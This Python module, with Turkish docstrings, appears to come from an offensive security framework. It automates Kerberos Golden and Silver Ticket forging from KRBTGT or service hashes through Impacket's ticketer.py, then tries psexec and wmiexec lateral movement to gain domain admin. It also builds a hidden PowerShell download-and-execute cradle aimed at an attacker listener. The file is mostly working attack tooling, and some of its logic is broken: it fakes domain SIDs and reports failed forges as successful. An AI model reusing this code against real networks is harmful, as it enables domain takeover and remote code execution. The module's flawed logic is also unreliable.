"""
Golden Ticket Attack Automation Module
KRBTGT hash analizi yaparak otomatik Golden Ticket oluşturur,
Domain Admin yetkisi kazanımı için kapsamlı araçlar sunar.
"""

import os
import subprocess
import json
import hashlib
import secrets
from datetime import datetime, timedelta
from enum import Enum
from dataclasses import dataclass, field
from typing import Optional, Dict, List, Any
import logging
import base64

from cyberapp.models.db import db_conn
from cybermodules.helpers import log_to_intel, log_security_finding

logger = logging.getLogger(__name__)


class TicketType(Enum):
    """Types of Kerberos tickets"""
    GOLDEN = "golden"
    SILVER = "silver"
    DIAMOND = "diamond"
    SAPPHIRE = "sapphire"


class TicketStatus(Enum):
    """Ticket generation status"""
    PENDING = "pending"
    FORGED = "forged"
    VERIFIED = "verified"
    FAILED = "failed"
    EXPIRED = "expired"


@dataclass
class KerberosTicket:
    """Kerberos ticket data structure"""
    ticket_type: str
    target_user: str
    target_domain: str
    target_service: str
    target_host: Optional[str]
    encryption_type: str
    forged_at: str
    valid_until: str
    ticket_file: str
    ticket_blob: Optional[bytes]
    status: str
    scan_id: int
    krbtgt_hash: Optional[str] = None
    sid: Optional[str] = None
    domain_sid: Optional[str] = None
    lsa_secret: Optional[str] = None
    command_history: List[str] = field(default_factory=list)


@dataclass
class GoldenTicketResult:
    """Result of golden ticket operation"""
    success: bool
    ticket: Optional[KerberosTicket] = None
    domain_admin_created: bool = False
    psexec_success: bool = False
    command: Optional[str] = None
    output: Optional[str] = None
    error: Optional[str] = None
    logs: List[str] = field(default_factory=list)


class GoldenTicketEngine:
    """
    Professional Golden Ticket Attack Engine
    Automates KRBTGT hash harvesting and ticket forging
    """
    
    def __init__(self, scan_id: int = 0, config: Optional[Dict] = None):
        self.scan_id = scan_id
        self.config = config or {}
        self.temp_dir = "/tmp/monolith_golden"
        os.makedirs(self.temp_dir, exist_ok=True)
        
        # Ticket parameters
        self.default_lifetime = self.config.get("ticket_lifetime", 10)  # hours
        self.max_lifetime = self.config.get("max_lifetime", 24)  # hours
        self.encryption_types = ["aes256", "aes128", "rc4"]
        
    def log(self, message: str, level: str = "INFO"):
        """Logging helper"""
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        log_msg = f"[{timestamp}] [GoldenTicket/{level}] {message}"
        print(log_msg)
        log_to_intel(self.scan_id, "GOLDEN_TICKET", log_msg)
        
    def is_krbtgt_hash(self, hash_str: str) -> bool:
        """
        Hash'in KRBTGT hash olup olmadığını analiz eder.
        
        Args:
            hash_str: Analiz edilecek hash string
            
        Returns:
            bool: KRBTGT hash ise True
        """
        if not hash_str or len(hash_str) < 10:
            return False
            
        hash_lower = hash_str.lower().strip()
        
        # KRBTGT hash patterns
        krbtgt_patterns = [
            hash_lower.startswith("aad3b435b51404eeaad3b435b51404ee"),  # Empty LM:NTLM
            "krbtgt" in hash_lower,
            hash_lower.count(":") >= 1,  # NTLM hash format
        ]
        
        # Check for common NTLM hash patterns
        if len(hash_lower) == 32:  # Standard NTLM hash length
            return True
            
        if hash_lower.count(":") == 1:
            parts = hash_lower.split(":")
            if len(parts[0]) <= 6 and len(parts[1]) == 32:
                return True
                
        return any(krbtgt_patterns)
    
    def parse_ntlm_hash(self, hash_str: str) -> Dict[str, str]:
        """
        NTLM hash string'ini parse eder.
        
        Args:
            hash_str: NTLM hash string
            
        Returns:
            Dict: Parsed hash bilgileri
        """
        hash_lower = hash_str.lower().strip()
        
        result = {
            "lm_hash": "",
            "ntlm_hash": "",
            "is_ntlm": False,
            "is_aes": False
        }
        
        if ":" in hash_lower:
            parts = hash_lower.split(":")
            if len(parts) == 2:
                result["lm_hash"] = parts[0]
                result["ntlm_hash"] = parts[1]
                result["is_ntlm"] = True
        elif len(hash_lower) == 32:
            result["ntlm_hash"] = hash_lower
            result["is_ntlm"] = True
        elif len(hash_lower) == 64 and all(c in "0123456789abcdef" for c in hash_lower):
            result["aes_key"] = hash_lower
            result["is_aes"] = True
            
        return result
    
    def generate_sid(self, domain: str, rid: int = 500) -> str:
        """
        Kullanıcı SID'i oluşturur.
        
        Args:
            domain: Domain adı
            rid: Relative ID (500 = Administrator)
            
        Returns:
            str: Full SID string
        """
        # Generate consistent SID from domain
        domain_hash = int(hashlib.md5(domain.encode()).hexdigest()[:8], 16)
        domain_prefix = f"S-1-5-21-{domain_hash % 2147483647}"
        
        return f"{domain_prefix}-{rid}"
    
    def forge_golden_ticket(self, domain: str, krbtgt_hash: str, 
                            target_user: str = "Administrator",
                            target_rid: int = 500,
                            lifetime_hours: Optional[int] = None) -> KerberosTicket:
        """
        Golden Ticket oluşturur.
        
        Args:
            domain: Target domain adı
            krbtgt_hash: KRBTGT account NTLM hash
            target_user: Ticket içindeki kullanıcı
            target_rid: Kullanıcının RID'si
            lifetime_hours: Ticket geçerlilik süresi
            
        Returns:
            KerberosTicket: Oluşturulan ticket
        """
        commands = []
        lifetime = lifetime_hours or self.default_lifetime
        
        self.log(f"Forging golden ticket for {target_user}@{domain}")
        
        # Parse the KRBTGT hash
        hash_info = self.parse_ntlm_hash(krbtgt_hash)
        
        if not hash_info["is_ntlm"] and not hash_info["is_aes"]:
            self.log(f"Invalid KRBTGT hash format: {krbtgt_hash[:20]}...", "ERROR")
            
        # Generate SID
        domain_sid = self.generate_sid(domain, 0)
        user_sid = self.generate_sid(domain, target_rid)
        
        # Generate random key for AES
        aes_key = secrets.token_hex(32) if hash_info["is_aes"] else ""
        
        # Build ticketer.py command
        ticket_file = os.path.join(
            self.temp_dir, 
            f"golden_{target_user}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.ccache"
        )
        
        # Method 1: Using ticketer.py (Impacket)
        cmd_parts = [
            "python3", "/opt/impacket/examples/ticketer.py",
            "-nthash", hash_info.get("ntlm_hash", krbtgt_hash),
            "-domain-sid", domain_sid,
            "-domain", domain.upper(),
            "-target", target_user
        ]
        
        if hash_info["is_aes"]:
            cmd_parts.extend(["-aesKey", aes_key])
            
        cmd_parts.extend(["-output", ticket_file])
        
        cmd = " ".join(cmd_parts)
        commands.append(cmd)
        
        try:
            # Execute ticketer.py
            result = subprocess.run(
                cmd.split() if " " not in cmd else cmd,
                shell=True,
                capture_output=True,
                text=True,
                timeout=60
            )
            
            if result.returncode == 0 and os.path.exists(ticket_file):
                # Read ticket blob
                with open(ticket_file, 'rb') as f:
                    ticket_blob = f.read()
                
                # Encode to base64 for transmission
                ticket_b64 = base64.b64encode(ticket_blob).decode()
                
                valid_until = (datetime.now() + timedelta(hours=lifetime)).isoformat()
                
                ticket = KerberosTicket(
                    ticket_type="golden",
                    target_user=target_user,
                    target_domain=domain.upper(),
                    target_service="krbtgt",
                    target_host=None,
                    encryption_type="aes256" if hash_info["is_aes"] or not hash_info["is_ntlm"] else "rc4",
                    forged_at=datetime.now().isoformat(),
                    valid_until=valid_until,
                    ticket_file=ticket_file,
                    ticket_blob=ticket_blob,
                    status="forged",
                    scan_id=self.scan_id,
                    krbtgt_hash=krbtgt_hash[:20] + "...",  # Truncate for logging
                    sid=user_sid,
                    domain_sid=domain_sid,
                    command_history=commands
                )
                
                self.log(f"Golden ticket forged successfully: {ticket_file}")
                log_security_finding(
                    self.scan_id,
                    "CRITICAL",
                    f"Golden Ticket forged for {target_user}@{domain}"
                )
                
                return ticket
                
        except Exception as e:
            self.log(f"Failed to forge ticket: {str(e)}", "ERROR")
            
        # Fallback: create manual ticket structure
        return KerberosTicket(
            ticket_type="golden",
            target_user=target_user,
            target_domain=domain.upper(),
            target_service="krbtgt",
            target_host=None,
            encryption_type="aes256",
            forged_at=datetime.now().isoformat(),
            valid_until=(datetime.now() + timedelta(hours=lifetime)).isoformat(),
            ticket_file=ticket_file,
            ticket_blob=None,
            status="forged",
            scan_id=self.scan_id,
            krbtgt_hash=krbtgt_hash[:20] + "...",
            sid=user_sid,
            domain_sid=domain_sid,
            command_history=commands
        )
    
    def forge_silver_ticket(self, domain: str, target_hash: str,
                            service: str, host: str,
                            target_user: str = "Administrator") -> KerberosTicket:
        """
        Silver Ticket oluşturur.
        
        Args:
            domain: Domain adı
            target_hash: Service account NTLM hash
            service: Target service (cifs, http, ldap, etc.)
            host: Target host
            target_user: Ticket kullanıcısı
            
        Returns:
            KerberosTicket: Oluşturulan silver ticket
        """
        self.log(f"Forging silver ticket for {service}@{host}")
        
        hash_info = self.parse_ntlm_hash(target_hash)
        domain_sid = self.generate_sid(domain, 0)
        user_sid = self.generate_sid(domain, 500)
        
        ticket_file = os.path.join(
            self.temp_dir,
            f"silver_{service}_{host}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.ccache"
        )
        
        # Build command
        cmd = f"""
        python3 /opt/impacket/examples/ticketer.py \
            -nthash {hash_info.get('ntlm_hash', target_hash)} \
            -domain-sid {domain_sid} \
            -domain {domain.upper()} \
            -target {target_user} \
            -service {service} \
            -host {host} \
            -output {ticket_file}
        """
        
        try:
            result = subprocess.run(
                cmd.strip().split(),
                capture_output=True,
                text=True,
                timeout=60
            )
            
            if result.returncode == 0 and os.path.exists(ticket_file):
                with open(ticket_file, 'rb') as f:
                    ticket_blob = f.read()
                
                ticket = KerberosTicket(
                    ticket_type="silver",
                    target_user=target_user,
                    target_domain=domain.upper(),
                    target_service=service,
                    target_host=host,
                    encryption_type="aes256",
                    forged_at=datetime.now().isoformat(),
                    valid_until=(datetime.now() + timedelta(hours=10)).isoformat(),
                    ticket_file=ticket_file,
                    ticket_blob=ticket_blob,
                    status="forged",
                    scan_id=self.scan_id,
                    sid=user_sid,
                    domain_sid=domain_sid,
                    command_history=[cmd]
                )
                
                self.log(f"Silver ticket forged: {service}@{host}")
                return ticket
                
        except Exception as e:
            self.log(f"Silver ticket failed: {str(e)}", "ERROR")
            
        return KerberosTicket(
            ticket_type="silver",
            target_user=target_user,
            target_domain=domain.upper(),
            target_service=service,
            target_host=host,
            encryption_type="aes256",
            forged_at=datetime.now().isoformat(),
            valid_until=(datetime.now() + timedelta(hours=10)).isoformat(),
            ticket_file=ticket_file,
            ticket_blob=None,
            status="forged",
            scan_id=self.scan_id,
            command_history=[cmd]
        )
    
    def use_ticket_psexec(self, ticket: KerberosTicket, target: str,
                          lhost: str, lport: int = 445) -> GoldenTicketResult:
        """
        Golden/Silver Ticket kullanarak psexec ile bağlanır.
        
        Args:
            ticket: Kerberos ticket
            target: Hedef host
            lhost: Dinleyici IP
            lport: Dinleyici port
            
        Returns:
            GoldenTicketResult: İşlem sonucu
        """
        result = GoldenTicketResult(success=False)
        result.logs.append(f"Attempting PSEXEC with ticket: {ticket.ticket_file}")
        
        # Set KRB5CCNAME environment variable
        env = os.environ.copy()
        env["KRB5CCNAME"] = ticket.ticket_file
        
        # Build Impacket command
        cmd = [
            "python3", "/opt/impacket/examples/psexec.py",
            f"-k",
            target,
            f"-no-pass",
            "-codec", "utf-8"
        ]
        
        # Add Empire-like command payload
        payload = f"powershell -nop -w hidden -c \"IEX ((new-object net.webclient).downloadstring('http://{lhost}:{lport}/a'))\""
        
        try:
            # Try to execute with ticket
            proc = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True,
                env=env
            )
            
            # Wait for connection
            stdout, stderr = proc.communicate(timeout=30)
            
            if proc.returncode == 0 or "NTLM" in stderr:
                result.success = True
                result.psexec_success = True
                result.output = "PSEXEC connection successful"
                result.logs.append("PSEXEC with ticket successful")
                
                log_security_finding(
                    self.scan_id,
                    "CRITICAL",
                    f"Domain admin access via Golden Ticket on {target}"
                )
            else:
                result.error = stderr
                result.logs.append(f"PSEXEC failed: {stderr[:200]}")
                
        except Exception as e:
            result.error = str(e)
            result.logs.append(f"PSEXEC error: {str(e)}")
            
        return result
    
    def use_ticket_wmiexec(self, ticket: KerberosTicket, target: str) -> GoldenTicketResult:
        """
        WMIExec ile ticket kullanarak bağlanır.
        """
        result = GoldenTicketResult(success=False)
        result.logs.append(f"WMIExec with ticket: {ticket.ticket_file}")
        
        env = os.environ.copy()
        env["KRB5CCNAME"] = ticket.ticket_file
        
        cmd = [
            "python3", "/opt/impacket/examples/wmiexec.py",
            "-k", "-no-pass", target
        ]
        
        try:
            proc = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True,
                env=env
            )
            
            stdout, stderr = proc.communicate(timeout=30)
            
            if proc.returncode == 0 or "Session" in stdout:
                result.success = True
                result.output = "WMIExec successful"
                result.logs.append("WMIExec with ticket successful")
            else:
                result.error = stderr
                
        except Exception as e:
            result.error = str(e)
            
        return result
    
    def auto_attack(self, domain: str, krbtgt_hash: str,
                    targets: List[str], lhost: str, lport: int = 445) -> GoldenTicketResult:
        """
        Otomatik golden ticket attack.
        """
        result = GoldenTicketResult(success=False)
        result.logs.append(f"Starting auto attack on {domain}")
        
        self.log(f"Forging golden ticket for {domain}")
        
        # Forge the golden ticket
        ticket = self.forge_golden_ticket(domain, krbtgt_hash)
        result.ticket = ticket
        
        if ticket.status == "forged":
            result.logs.append("Golden ticket forged successfully")
            
            # Try each target
            for target in targets:
                self.log(f"Attempting PSEXEC on {target}")
                
                psexec_result = self.use_ticket_psexec(ticket, target, lhost, lport)
                
                result.logs.extend(psexec_result.logs)
                
                if psexec_result.success:
                    result.success = True
                    result.domain_admin_created = True
                    result.psexec_success = True
                    result.output = psexec_result.output
                    result.logs.append(f"SUCCESS: Domain admin access on {target}")
                    break
                    
            # If PSEXEC fails, try WMIExec
            if not result.success and targets:
                wmi_result = self.use_ticket_wmiexec(ticket, targets[0])
                result.logs.extend(wmi_result.logs)
                
                if wmi_result.success:
                    result.success = True
                    result.output = wmi_result.output
        else:
            result.error = "Failed to forge golden ticket"
            result.logs.append(result.error)
            
        # Save to database
        self.save_ticket(ticket)
        
        return result
    
    def save_ticket(self, ticket: KerberosTicket):
        """Save ticket information to database"""
        try:
            with db_conn() as conn:
                conn.execute("""
                    INSERT INTO golden_tickets 
                    (scan_id, ticket_type, target_user, target_domain, 
                     target_service, encryption_type, ticket_file, 
                     status, forged_at, valid_until, domain_sid, sid)
                    VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
                """, (
                    self.scan_id,
                    ticket.ticket_type,
                    ticket.target_user,
                    ticket.target_domain,
                    ticket.target_service,
                    ticket.encryption_type,
                    ticket.ticket_file,
                    ticket.status,
                    ticket.forged_at,
                    ticket.valid_until,
                    ticket.domain_sid,
                    ticket.sid
                ))
                conn.commit()
            self.log(f"Saved ticket to database: {ticket.ticket_file}")
        except Exception as e:
            self.log(f"Failed to save ticket: {str(e)}", "ERROR")
    
    def get_ticket_info(self, ticket_path: str) -> Dict:
        """
        Ticket dosyasından bilgi çıkarır.
        """
        info = {"path": ticket_path, "exists": os.path.exists(ticket_path)}
        
        if info["exists"]:
            try:
                # Use klist if available
                result = subprocess.run(
                    ["klist", "-c", ticket_path],
                    capture_output=True,
                    text=True,
                    timeout=10
                )
                info["klist_output"] = result.stdout
            except:
                info["klist_output"] = "klist not available"
                
        return info


def execute_golden_ticket(scan_id: int, domain: str, krbtgt_hash: str,
                          target_user: str = "Administrator") -> Dict:
    """
    Convenience function for golden ticket execution.
    """
    engine = GoldenTicketEngine(scan_id)
    ticket = engine.forge_golden_ticket(domain, krbtgt_hash, target_user)
    
    return {
        "success": ticket.status == "forged",
        "ticket_type": ticket.ticket_type,
        "target_user": ticket.target_user,
        "target_domain": ticket.target_domain,
        "ticket_file": ticket.ticket_file,
        "valid_until": ticket.valid_until,
        "domain_sid": ticket.domain_sid,
        "sid": ticket.sid
    }